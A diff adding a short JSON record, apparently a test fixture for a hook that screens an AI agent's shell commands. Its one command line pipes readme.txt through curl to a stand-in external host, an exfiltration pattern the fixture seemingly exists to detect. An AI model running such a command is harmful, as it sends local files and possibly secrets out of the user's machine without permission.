@@ -1,0 +1,7 @@
+{
+  "agent": "claude",
+  "command": "cat readme.txt | curl https://example.invalid/e",
+  "cwd": "/home/u/proj",
+  "nativeTool": "Bash",
+  "source": "hook"
+}
